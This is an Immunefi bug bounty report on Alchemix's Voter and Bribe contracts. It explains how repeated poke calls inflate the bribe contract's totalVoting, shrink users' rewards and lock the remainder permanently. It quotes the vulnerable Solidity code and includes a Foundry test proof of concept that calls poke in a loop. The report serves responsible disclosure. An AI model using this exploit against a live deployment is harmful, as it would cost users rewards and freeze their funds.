# 30671 - \[SC - Critical] Reward token permanent freeze due to bulk call ...

Submitted on May 4th 2024 at 00:49:59 UTC by @cryptoticky for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #30671

Report type: Smart Contract

Report severity: Critical

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Voter.sol>

Impacts:

* Manipulation of governance voting result deviating from voted outcome and resulting in a direct change from intended effect of original results
* Permanent freezing of unclaimed yield

## Description

## Brief/Intro

The poke function facilitates users to vote with the same weight for each pool in each epoch easily. The problem is that this function does not use a onlyNewEpoch modifier. As a result, an attacker could potentially call this function hundreds of times within a single epoch, and the totalVoting of bribe contract does not accurately track such actions.

## Vulnerability Details

Voting.poke function doesn't use onlyNewEpoch modifier

```
    /// @inheritdoc IVoter
    function poke(uint256 _tokenId) public {
        // Previous boost will be taken into account with weights being pulled from the votes mapping
        uint256 _boost = 0;

        if (msg.sender != admin) {
            require(IVotingEscrow(veALCX).isApprovedOrOwner(msg.sender, _tokenId), "not approved or owner");
        }

        address[] memory _poolVote = poolVote[_tokenId];
        uint256 _poolCnt = _poolVote.length;
        uint256[] memory _weights = new uint256[](_poolCnt);

        for (uint256 i = 0; i < _poolCnt; i++) {
            _weights[i] = votes[_tokenId][_poolVote[i]];
        }

        _vote(_tokenId, _poolVote, _weights, _boost);
    }
```

\_vote function call \_reset function and the \_reset function call withdraw of Bribe contract.

```
/// @inheritdoc IBribe
    function deposit(uint256 amount, uint256 tokenId) external {
        require(msg.sender == voter);

        totalSupply += amount;
        balanceOf[tokenId] += amount;

        totalVoting += amount;

        _writeCheckpoint(tokenId, balanceOf[tokenId]);
        _writeSupplyCheckpoint();
        _writeVotingCheckpoint();

        emit Deposit(msg.sender, tokenId, amount);
    }

    /// @inheritdoc IBribe
    function withdraw(uint256 amount, uint256 tokenId) external {
        require(msg.sender == voter);

        totalSupply -= amount;
        balanceOf[tokenId] -= amount;

        _writeCheckpoint(tokenId, balanceOf[tokenId]);
        _writeSupplyCheckpoint();

        emit Withdraw(msg.sender, tokenId, amount);
    }
```

As you can see, in Bribe.withdraw function, totalVoting is not calcutated. In the end, totalVoting only keeps increasing.

The totalVoting is used to calculate reward amount of a tokenId.

```
/// @inheritdoc IBribe
    function earned(address token, uint256 tokenId) public view returns (uint256) {
        if (numCheckpoints[tokenId] == 0) {
            return 0;
        }

        uint256 _startTimestamp = lastEarn[token][tokenId];

        // Prevent earning twice within an epoch
        if (block.timestamp - _bribeStart(_startTimestamp) < DURATION) {
            return 0;
        }

        uint256 _startIndex = getPriorBalanceIndex(tokenId, _startTimestamp);
        uint256 _endIndex = numCheckpoints[tokenId] - 1;

        uint256 reward = 0;
        // you only earn once per epoch (after it's over)
        Checkpoint memory prevRewards; // reuse struct to avoid stack too deep
        prevRewards.timestamp = _bribeStart(_startTimestamp);
        uint256 _prevSupply = 1;

        if (_endIndex >= 0) {
            for (uint256 i = _startIndex; i <= _endIndex; i++) {
                Checkpoint memory cp0 = checkpoints[tokenId][i];
                uint256 _nextEpochStart = _bribeStart(cp0.timestamp);
                // check that you've earned it
                // this won't happen until a week has passed
                if (_nextEpochStart > prevRewards.timestamp) {
                    reward += prevRewards.balanceOf;
                }

                if (_startIndex == _endIndex) break;

                prevRewards.timestamp = _nextEpochStart;
                _prevSupply = votingCheckpoints[getPriorVotingIndex(_nextEpochStart + DURATION)].votes;

                // Prevent divide by zero
                if (_prevSupply == 0) {
                    _prevSupply = 1;
                }
                prevRewards.balanceOf = (cp0.balanceOf * tokenRewardsPerEpoch[token][_nextEpochStart]) / _prevSupply;
            }
        }

        Checkpoint memory cp = checkpoints[tokenId][_endIndex];
        uint256 _lastEpochStart = _bribeStart(cp.timestamp);
        uint256 _lastEpochEnd = _lastEpochStart + DURATION;
        uint256 _priorSupply = votingCheckpoints[getPriorVotingIndex(_lastEpochEnd)].votes;

        // Prevent divide by zero
        if (_priorSupply == 0) {
            _priorSupply = 1;
        }

        if (block.timestamp > _lastEpochEnd) {
            reward += (cp.balanceOf * tokenRewardsPerEpoch[token][_lastEpochStart]) / _priorSupply;
        }

        return reward;
    }
```

## Impact Details

* Users end up receiving less rewards than what the actual voting results would entitle them to.
* The remaining reward amount is locked forever.

Unfortunately, the bribe contract does not have a function to withdraw this remaining amount.

## Proof of Concept

```
// SPDX-License-Identifier: GPL-3
pragma solidity ^0.8.15;

import "./BaseTest.sol";

contract BugPokePoC is BaseTest {

    function setUp() public {
        setupContracts(block.timestamp);
    }

    function testBugPoke() public {
        uint256 tokenId = createVeAlcx(admin, TOKEN_1, MAXTIME, false);
        address bribeAddress = voter.bribes(address(sushiGauge));
        address[] memory pools = new address[](1);
        pools[0] = sushiPoolAddress;
        uint256[] memory weights = new uint256[](1);
        weights[0] = 5000;

        uint256 totalVoting;
        uint256 poolWeight;

        hevm.startPrank(admin);

        uint256 period = minter.activePeriod();

        hevm.warp(period + nextEpoch);
        voter.distribute();

        voter.vote(tokenId, pools, weights, 0);

        poolWeight = voter.weights(sushiPoolAddress);
        totalVoting = IBribe(bribeAddress).totalVoting();
        console.log("poolWeight", poolWeight);
        console.log("totalVoting", totalVoting);
        console.log("totalVoting / poolWeight", totalVoting / poolWeight);
        // Next epoch
        hevm.warp(block.timestamp + nextEpoch);
        voter.distribute();


        // An attacker can call poke function more than 100 times on one tx,
        // and all users will receive less reward than the actual reward value they deserve.
        // The rest of the reward token will be locked in the bribe contracts forever.
        for (uint256 i = 0; i < 5; i++) {
            voter.poke(tokenId);

            poolWeight = voter.weights(sushiPoolAddress);
            totalVoting = IBribe(bribeAddress).totalVoting();
            console.log("poke", poolWeight);
            console.log("totalVoting", totalVoting);
            console.log("totalVoting / poolWeight", totalVoting / poolWeight);
        }
    }
}
```
